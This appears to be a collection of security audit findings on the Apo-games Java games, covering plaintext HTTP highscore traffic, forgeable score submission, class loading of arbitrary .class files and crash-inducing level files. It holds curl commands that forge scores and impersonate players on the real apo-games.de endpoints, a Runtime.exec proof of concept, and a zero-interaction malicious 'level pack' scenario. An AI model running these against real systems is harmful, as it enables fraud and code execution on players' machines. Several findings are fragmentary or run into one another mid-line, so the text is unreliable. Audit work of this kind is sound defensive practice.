data_path: ApoJumpStateGame.upload() -> ApoHighscore.save() -> new URL(HIGHSCORE_SAVEPHP).openConnection(); ApoJumpPanel.init():75 -> ApoJumpStateAchievements.loadAchievements():64 -> ApoHelp.loadData(new URL(PROGRAM_URL), COOKIE_NAME) -> cookies.php over http://.
attack_scenario: 1) Attacker on the same LAN/DNS path passively sniffs port 80: sees player-submitted names, points, times, and the achievements-cookie values of every client. 2) Active MITM rewrites responses (see findings 03/04) or the save request itself. No TLS or pinning exists anywhere in the variant to stop this.
preconditions: ApoConstants.B_ONLINE is hard-coded true (ApoConstants.java:16); attacker needs a network vantage point (same LAN, ARP/DNS spoof, rogue DHCP) or control of apo-games.de resolution.
validation_plan: Point www.apo-games.de to a local listener via /etc/hosts, start ApoJumpMain, open the highscore screen and finish one run. Observer shows cleartext POST bodies 'points=..&time=..&name=..' and 'GET=&name=apoIcarus_level' / 'SET=&name=..' to /apoIcarus/cookies.php. tcpdump/wireshark confirms zero TLS handshake.

title: Highscore submission is unsigned and unauthenticated: leaderboard fully forgeable by local user
entry_point: The server accepts these POSTs from anyone; the only sender-side gate is the in-game flow ApoJumpStateGame.uploadScore() -> upload() (apoJump/game/ApoJumpStateGame.java:211-219), which carries no session token, signature, or proof-of-play.
sink: printout.writeBytes(content) at ApoHighscore.java:77 into the POST to save_highscore.php
data_path: Game-computed points/time come from ApoJumpLevel.getPoints()/getTime(), name from an 11-char textfield, but none of it is bound to any credential: the wire format is exactly three form fields, so the same request can be produced outside the game with arbitrary values.
attack_scenario: A cheater runs: curl -X POST -d 'points=999999999&time=0&name=<anyone>' http://www.apo-games.de/apoIcarus/save_highscore.php --data-urlencode nothing else required. Next client that opens the highscore list displays the forged score at rank 1 (rendered in ApoJumpStateHighscore.render:215-228), and ApoJumpLevel draws the fake leader's name in-game (level render lines 428-434). Attacker gains leaderboard defacement / impersonation of other players' names.
preconditions: save_highscore.php reachable and still accepting submissions (no client-side check beyond B_ONLINE=true).

Then prove the primitive works: compile a class Malicious { public Malicious(){Runtime.getRuntime().exec("touch /tmp/pwn");} }, run `new ApoClassLoader("file:///tmp", "Malicious").getMyClass()` in a test harness and observe /tmp/pwn created - demonstrating that any future caller hands it RCE.

title: Highscore submit/fetch over plain HTTP to apo-games.de with unauthenticated, fully forgeable scores
code_excerpt:
public final static String HIGHSCORE_GETPHP = "http://www.apo-games.de/apoNotSoSimple/get_highscore.php";
public final static String HIGHSCORE_SAVEPHP = "http://www.apo-games.de/apoNotSoSimple/save_highscore.php";
entry_point: ApoHighscore.save()/load() (org/apogames/help/ApoHighscore.java:63 and :109) open these URLs when ApoConstants.B_ONLINE==true (default true, ApoConstants.java:16). However, grep shows ApoHighscore has NO callers anywhere in the ApoMarc variant - the feature is orphaned here.
sink: urlConn.getOutputStream() writes 'level=..&points=..&name=..' plaintext POST (ApoHighscore.java:72-77); urlConn.getInputStream() reads server-controlled response (ApoHighscore.java:81, 126)
data_path: (if wired) game-over logic -> ApoHighscore.getInstance().save(level,solution,name) -> URL(HIGHSCORE_SAVEPHP).openConnection() -> DataOutputStream.writeBytes(content) over HTTP
attack_scenario: Theoretical in this variant; real in siblings that call it. (a) Network attacker/MITM reads the player's chosen name and modifies the response of load(), injecting arbitrary scoreboard names rendered in-game. (b) Local cheat: `curl -d 'level=99&points=999999&name=cheater' http://www.apo-games.de/apoNotSoSimple/save_highscore.php` submits a top score without playing - there is no signature, token, or session in the request (verified: content string at ApoHighscore.java:74-76 is the entire payload).
preconditions: For network interception: the game must call ApoHighscore (it does not in ApoMarc) and the victim must play on a hostile network. For score forging: only access to the still-live endpoint. Note: domain may be defunct as of audit date.
validation_plan: Orphan check: `grep -rn "ApoHighscore" --include=*.java . | grep -v help/ApoHighscore.java` returns nothing. Reachability of the flaw itself: run a traffic-capturing proxy (mitmproxy in transparent mode) or `tcpdump port 80`, temporarily invoke ApoHighscore.getInstance().save(7, 12345, "test") from a harness, observe the POST body in cleartext including name; replay the same POST via curl twice and see two identical entries accepted server-side (proves no nonce/integrity).

title: Highscore loader trusts server response format; NumberFormatException from server data escapes handler

If wired: a hostile or hijacked server (or HTTP MITM) responds with 'abc' on a points line; Integer.valueOf throws NumberFormatException, which is NOT caught (only MalformedURLException and IOException are caught, lines 141-147), crashing the calling thread/game. Server also controls arbitrary strings displayed in the highscore UI.

title: ApoIO base class performs raw HTTP GET/POST level transfer in applet mode; no subclass in this variant
code_excerpt:
URL connection = new URL(fileName);
data = new DataInputStream(connection.openStream());
entry_point: readLevel(String)/readLevel(boolean bURL,...): when bURL==true (applet mode passes ApoConstants.B_APPLET, line 68) any fileName string is opened as URL; writeLevel(String) likewise POSTs to an arbitrary URL (lines 40-43). In this variant ZERO classes extend ApoIO (grep for 'extends ApoIO' finds none), so readLevel(DataInputStream)/writeLevel(DataOutputStream) bodies are empty abstractions.
sink: connection.openStream() pulling untrusted bytes into the abstract hand-written parser readLevel(DataInputStream) implemented by subclasses (none here); writeLevel POSTing game data over HttpURLConnection (line 41)
data_path: (in siblings) level-server download -> readLevel(bURL=true, url) -> openStream -> DataInputStream -> subclass's byte-level parse loop. In ApoMarc the chain terminates at the abstract method.
attack_scenario: Theoretical here. This is exactly the infrastructure behind the corpus-wide '.mar/.skunk/get_level.php' pattern: in variants that subclass ApoIo, a malicious level server or HTTP MITM supplies truncated/hostile streams to hand-rolled parsers with no length/format validation. In ApoMarc no such parser exists, so there is nothing to attack.
preconditions: A subclass implementing readLevel(DataInputStream) and a caller passing bURL=true with an attacker-chosen URL; neither exists in this variant.
validation_plan: Orphan proof: `grep -rn "extends ApoIO" --include=*.java .` returns zero hits; instantiate an anonymous ApoIo in a harness and call readLevel(true,"http://127.0.0.1:8000/x") against netcat serving junk to confirm the transport opens before any parse - establishing that safety depends entirely on absent subclasses.

title: MD5 helper present in shared library but never invoked (orphaned weak-hash capability)

data_path: caller-provided string -> getMd5Digest -> MD5 -> 32-char uppercase hex returned. No data flows into it in ApoMarc.
attack_scenario: Theoretical: in variants that validate levels/highscores with this function, MD5 collisions allow crafting substitute artifacts with matching checksums. In ApoMarc the function is inert, so no attacker action applies.

validation_plan: Run `grep -rn "getMd5Digest" --include=*.java .` - single hit at the definition. Cross-check sibling variants for callers to confirm the shared-component propagation hypothesis.

title: Custom ClassLoader defineClass()+newInstance() of local .class files, auto-triggered from mario.properties at startup
code_excerpt: byte data[] = loadClassData(filename); ... c = defineClass(data, 0, data.length);  // then in getAI(): o = c.newInstance();
entry_point: (a) 'aiLeft'/'aiRight' values in mario.properties in the current working directory, read unattended at startup; (b) any .class file picked in the 'load player' JFileChooser (menu/analysis frame)
sink: ClassLoader.defineClass (ApoMarioClassLoader.java:74) followed by Class.newInstance (:41); loaded object's think() then runs every game tick
data_path: ApoMarioConstants.loadProperties() reads mario.properties via new FileInputStream("mario.properties") (ApoMarioConstants.java:39,90) -> AI_LEFT/AI_RIGHT (:129-130) -> ApoMarioPanel.loadPropertiesPlayer passes the non-numeric string to loadPlayer (ApoMarioPanel.java:153-154,176) -> ApoMarioLevel.loadPlayer(int,String) splits path/classname (ApoMarioLevel.java:1023-1048) -> loadPlayer(player,path,classname,classN) calls new ApoMarioClassLoader(path,classname).getAI() (ApoMarioLevel.java:1074) -> loadClassData() reads raw bytes from disk (ApoMarioClassLoader.java:106-129)
attack_scenario: Variant 1 (persistence, no interaction): attacker distributes a zip 'level pack' containing evil/Evil.class (extends ApoMarioAI, constructor writes files/starts connections) plus a mario.properties with aiLeft=C:\...\evil\Evil.class. Victim extracts next to the jar and launches ApoMarioMain; during init() the class is defined and instantiated before any click. Variant 2 (competition plugin model): victim downloads another player's 'AI' .class and loads it via the menu; it runs with full JVM privileges - no SecurityManager exists anywhere in the tree.
preconditions: Desktop mode (B_APPLET==false; guard at ApoMarioLevel.java:1073). For the properties vector: write access to the directory the game is started from, and a Windows-style backslash path (loadPlayer uses File.separator-'\\' parsing at ApoMarioLevel.java:1044-1046); on Linux/macOS the default parsing yields empty source dir, though crafted dotted values still resolve relative to CWD. For the chooser vector: user consent to load the file.
validation_plan: Compile Evil.java extends apoMario.ai.ApoMarioAI whose constructor writes C:/pwned.txt. Place it beside the jar, add mario.properties containing aiLeft=C\:\\path\\Evil.class, run java -jar ApoMario.jar. pwned.txt appears with zero interaction; ApoMarioConstants.saveProperties() (called at ApoMarioLevel.java:1092 and window close) re-persists the path, making it sticky. Repeat via Menu > Load Player picking Evil.class.

title: Unvalidated width/height integers from hand-parsed .mar level file drive giant array allocation (OOM crash)
code_excerpt: int width = data.readInt(); int height = data.readInt(); ... this.level.setLevelEntities(new ApoMarioEntity[height][width]);
entry_point: A malicious .mar editor-level file opened via 'Load level' file chooser (ApoMarioPanel.loadEditorLevel, ApoMarioPanel.java:251-256), or referenced indirectly by a crafted .rep replay (see ApoMario-04)
sink: new ApoMarioEntity[height][width] allocation and the subsequent width*height readInt() parse loop (ApoMarioEditorIO.java:59-96)
data_path: JFileChooser path -> editorIO.readLevel(path) (ApoMarioPanel.java:255) -> ApoMarioEditorIO.readLevel(DataInputStream) reads first two ints as dimensions with no bounds check (lines 53-54) -> array allocation (line 57). OutOfMemoryError is an Error, so the catch(Exception ex) at line 129 does NOT catch it and the EDT/thread dies

Victim loads it in the editor; the JVM attempts a ~2^60-element reference array, throws OutOfMemoryError, and the game dies (or hangs thrashing GC with moderately large values like 20000x20000 while allocating per-tile BufferedImages in makeWall/makeGroundWall).
preconditions: User opens the hostile .mar file; negative dimensions instead throw NegativeArraySizeException which IS swallowed by catch(Exception) at line 129 (harmless).
validation_plan: Create mar.bin with DataOutputStream.writeInt(Integer.MAX_VALUE-15) twice plus a few trailing ints; rename to evil.mar; Editor > Load level; observe immediate OutOfMemoryError on console / process death. Compare with width=100,height=15 control file which loads normally.

Second file with '5000','700000','-1',... demonstrates multi-minute hang in level generation (sample with jstack showing ApoMarioRandomLevel.makeRandomLevel frames).

title: Path built from replay-controlled levelString allows reading arbitrary files outside levels/ directory

sink: new FileInputStream(fileName) in ApoIO.readLevel(boolean,String) (_from_jar_ApoMario/org/apogames/ApoIO.java:216)

When the victim plays the replay, the game opens that file and interprets its bytes as binary level tiles; content surfaces only as corrupted level geometry/level-name string in the UI, so this is primarily a sandbox-boundary violation and crash primitive rather than a practical exfiltration channel.

title: Plain-HTTP level transfer infrastructure inherited from framework, but unreachable in this variant
code_excerpt: URL connectionURL = new URL(fileName); HttpURLConnection connection = (HttpURLConnection)connectionURL.openConnection(); connection.setDoOutput(true);
entry_point: Theoretical: ApoIO.writeLevel/readLevel URL branches execute only when ApoConstants.B_APPLET is true (set solely by ApoMarioApplet's static block / ApoAppletBufferedStrategy); likewise ApoImage.getImage would fetch images via ImageIO.read(new URL(pic)) (ApoImage.java:92-93)
sink: HTTP PUT/POST of level bytes to an arbitrary URL string (ApoIO.java:166-171) and cleartext URL image reads (ApoImage.java:93)
data_path: In applet mode every caller is disabled: file choosers are never created (ApoMarioComponent.java:102-116), editor/replay/player-load functions are guarded by !ApoConstants.B_APPLET (e.g. ApoMarioMenu.java:403-408,421,454-462), and the only server constant APPLET_LEVEL="http://apo-games.de/apoMario/" (ApoMarioComponent.java:37) has zero references in the whole tree. So no live network path exists today; this documents dormant cloned infrastructure.
attack_scenario: If a future variant re-enables applet-mode saving, level bytes (and any URLs handed to writeLevel) would travel unencrypted over HTTP, allowing a network MITM to read/inject level submissions. Today an attacker gains nothing: there is no reachable call site.
preconditions: Would require resurrecting applet deployment (dead since browser applet support ended) or new callers passing bURL=true; none exist in this snapshot.
validation_plan: Static proof: grep confirms single occurrence of APPLET_LEVEL (definition only) and that all writeLevel/readLevel(URL) invocations in apoMario.* go through overrides forcing local files; runtime proof: run ApoMarioApplet in appletviewer and verify no socket to apo-games.de is opened (tcpdump/lsof) because all IO buttons are hidden/disabled.

title: Highscore/user-level exchange with apo-games.de over plain HTTP (no TLS)
code_excerpt:
public final static String HIGHSCORE_GETPHP = "http://www.apo-games.de/apoNotSoSimple/get_highscore.php";
public final static String HIGHSCORE_SAVEPHP = "http://www.apo-games.de/apoNotSoSimple/save_highscore.php";
entry_point: Network traffic at game startup: ApoNotSoSimplePanel.init() line 92 calls game.getUserLevels().loadHighscore(), which spawns a thread calling ApoNotSoSimpleUserLevels.load() -> ApoHighscore.load() (ApoHighscore.java:141-195). Upload path: editor UPLOAD button (ApoNotSoSimpleEditor.java:287) -> ApoHighscore.save() (ApoHighscore.java:69-138). Applet-only progress sync: ApoNotSoSimplePanel.java:97/227 -> ApoHelp.loadData/saveData (ApoHelp.java:446/419, posts to PROGRAM_URL + "cookies.php").
sink: new URL("http://...").openConnection(); DataOutputStream(urlConn.getOutputStream()) / DataInputStream(urlConn.getInputStream()) at ApoHighscore.java:77-78, 86, 122, 150-151, 159, 167 and ApoHelp.java:424-435, 452-464.
data_path: ApoConstants.B_ONLINE is hardwired true (ApoConstants.java:16), so the desktop build performs these requests too. All payloads (level grid, chosen username, levelname, description, move solution, applet progress value) travel as cleartext form-encoded HTTP POST bodies; responses (5-line groups: level string, username, levelname, description, solution) come back in cleartext and are parsed by ApoNotSoSimpleUserLevels.
attack_scenario: 1) Attacker on the same LAN/coffee-shop WiFi (or any on-path position, or a hijacked DNS entry for www.apo-games.de) runs a transparent proxy. 2) On every game start they observe the victim's chosen username and level solutions in cleartext (privacy/pseudonymity loss). 3) They replace the get_highscore.php response with attacker-chosen content, injecting their own 'user levels', fake usernames, or oversized/malformed fields (see ApoNotSoSimple-02) into every player's client. 4) They can also strip/modify uploaded levels in transit.
preconditions: Attacker needs an on-path vantage point (LAN MITM, compromised router, malicious DNS) or control of apo-games.de; target must play the game online (default). No certificate warnings possible because there is no TLS.
validation_plan: Run the desktop client (java apoNotSoSimple.ApoNotSoSimpleMain) while capturing with Wireshark: observe cleartext POST to www.apo-games.de:80 immediately at startup. Then point www.apo-games.de at 127.0.0.1 via /etc/hosts, run netcat/mitmproxy on port 80, return crafted 5-line groups ('1' + 60 digits / username / levelname / description / solution), start the game and open Menu -> UserLevels: the forged level renders and is playable, proving full server-response control.

title: Server-controlled highscore lists parsed without cross-validation; misaligned data breaks client state
entry_point: HTTP response body of get_highscore.php, split line-by-line into five independent ArrayLists in ApoHighscore.load() (ApoHighscore.java:170-183: i%5==0->level, 1->usernames, 2->levelnames, 3->descriptions, else->solution). A network attacker controlling the connection (per ApoNotSoSimple-01) fully controls each list's contents and lengths independently.
sink: Hand-rolled substring slicing in ApoNotSoSimpleUserLevels.getLevel():123-134 (layer count taken from first character, then layer*30 two-char decimal tokens consumed) and index coupling in sort():66-105 where sortLevel is sized [3][level.size()] but filled from a list built over usernames.size() (sortList.get(i), line 102).
data_path: get_highscore.php response -> ApoHighscore.load() lists -> ApoNotSoSimpleUserLevels.load() -> sort() (unvalidated cross-list lengths) and getLevel() (unvalidated level-string grammar) -> ApoNotSoSimpleLevel constructor -> game render/logic.
attack_scenario: MITM returns N level-lines but fewer username-lines: sort() throws IndexOutOfBoundsException at line 102, the catch in load() (lines 60-62) sets this.highscore = null, and the next click on the 'User Levels' menu item (ApoNotSoSimplePanel.setUserGame, line 161 -> getLevel line 112) dereferences the null field, throwing NullPointerException into the AWT event thread; the user-level feature stays broken for the session. Alternatively a truncated level token stream aborts parsing (caught by catch(Throwable) at line 148, returning null) so a hostile server can selectively make user levels unusable. Impact is confined to client-side denial of service / feature breakage - no memory unsafety, and instruction strings are drawn via Graphics.drawString (ApoNotSoSimpleLevel.java:386), not interpreted.
preconditions: On-path attacker or malicious server per ApoNotSoSimple-01; victim opens the UserLevels menu after startup fetch.
validation_plan: Proxy get_highscore.php and reply with 10 groups where the username lines are omitted (only 50 lines total, i%5 mapping skewed). Launch the game, click 'UserLevels': console shows java.lang.IndexOutOfBoundsException from ApoNotSoSimpleUserLevels.sort line 102 followed by NullPointerException from getLevel, and the menu does nothing - confirming the path end-to-end.

title: Unauthenticated, unsigned level/solution submission to save_highscore.php
entry_point: The public HTTP endpoint http://www.apo-games.de/apoNotSoSimple/save_highscore.php, whose request format is fully specified by the client code (ApoHighscore.save, lines 69-138, invoked from ApoNotSoSimpleEditor.java:287).
sink: printout.writeBytes(content) (line 118) sends attacker-arbitrary levelname/username/description/solution/level tuples with no authentication token, no nonce, and no signature; the MD5 helper that exists for such checks (ApoHelp.getMd5Digest, ApoHelp.java:301-310) has zero callers in this variant (verified by grep).
data_path: Any HTTP client -> POST form body matching the five documented parameters -> server-side highscore store -> distributed to all clients via get_highscore.php -> parsed as genuine user levels (see ApoNotSoSimple-01/02 paths).
attack_scenario: 1) Attacker reproduces the request with curl (no game needed). 2) They submit levels attributed to arbitrary usernames (impersonation of other players), flood the shared pool with garbage or hundreds of entries, or publish 'solution' strings that never solve the posted level to troll solvers. 3) Every downstream client ingests this as trusted content. This is a design-level trust problem evidenced by the client: the protocol has no integrity mechanism whatsoever.
preconditions: save_highscore.php still deployed and reachable (the apo-games.de host was live historically); attacker needs only outbound internet access.
validation_plan: curl -X POST http://www.apo-games.de/apoNotSoSimple/save_highscore.php -d 'levelname=audit&username=SpoofedUser&description=x&solution=lrl&level=1' + 60 two-digit tile codes matching the encoding built at ApoHighscore.java:88-99 (layer digit + 30 zero-padded byte values per layer). Then launch the game and check whether the forged entry appears under UserLevels. If the host is offline, validate the format offline by feeding the same body through a local mock and confirming the client accepts it.

title: Remote/local class loading capability (URLClassLoader + newInstance) present but unreferenced dead code

The path/classname come solely from the constructor arguments (lines 19-22).

title: URLClassLoader loads and instantiates .class files from arbitrary local path or URL (dormant in this variant)
code_excerpt: url = new File( this.getPath() ).toURI().toURL(); ... URLClassLoader cl = new URLClassLoader( new URL[] { url } ); c = cl.loadClass( this.getClassname() ); return c.newInstance();
entry_point: Constructor args (path, classname). In this variant there is NO caller: grep for 'new ApoClassLoader|getMyClass' across all 79 files returns nothing outside the class itself. The intended entry point survives as a vestige: apoPongBeat/ApoPongBeatComponent.java:95-110 builds a JFileChooser filtered by new ApoFileFilter("class") 'zum Laden einer KI' (load an AI), but showOpenDialog() is never called anywhere.

attack_scenario: (where wired, e.g. sibling ApoSoccer) Attacker broadcasts a forged packet from a laptop: victim's browser lists 'FastGameServer 10.0.0.5:1337'; joining routes game traffic and any future protocol-level trust to the attacker. title: Remote random-image fetch from zufallsbild.com (HTTP scrape + ImageIO.read of derived URL) trapped in dead else-branch behind tautological condition

entry_point: HTTP: HTML scraped from http://www.zufallsbild.com/ via url.openStream() (line 31); the code then walks backwards from every '.jpg' occurrence until a double-quote char (34) and concatenates the substring onto myUrl to build 'imageString', which is fetched and decoded (lines 33-52)

If re-enabled: anyone controlling DNS/routing for zufallsbild.com (dead domain, trivially registrable) serves HTML whose '.jpg'-adjacent text steers imageString to an attacker URL, making the client issue GETs to arbitrary hosts (SSRF-style beacon) and feeding chosen bytes into the ImageIO decoder of every player clicking 'random level'.

sink: buttons.get(level - 1) at ApoSimpleLevelChooser.setVisibleButtons (ApoSimpleLevelChooser.java:136-141) executes OUTSIDE the try/catch that guards only io creation (lines 52-81); getMaxLevel()/setShowStart (lines 143-165,167-201) consume the same values
data_path: 'levels' file -> ApoSimpleLevelChooser.init() -> io.readLevel("levels") (line 56) -> ApoIO.readLevel -> ApoLevelIO.readLevel(DataInputStream) fills highscore list -> setVisibleButtons() indexes buttons with unchecked id; init() is invoked from ApoSimplePanel.setLevelChooser (ApoSimplePanel.java:555-561) when the player opens the level chooser
attack_scenario: (a) Tamper: edit 'levels' to contain level=1000000000; opening the level chooser throws IndexOutOfBoundsException on the game thread (no catch in ApoSubGame.run), freezing/killing the client. (b) Cheat: conversely, entries with level=1..N and stars=3 unlock every level and maximize star-based coin payouts granted in setLevelSolved/addLevel (ApoSimplePanel.java:716-718, ApoSimpleLevelChooser.java:224-241) without playing.
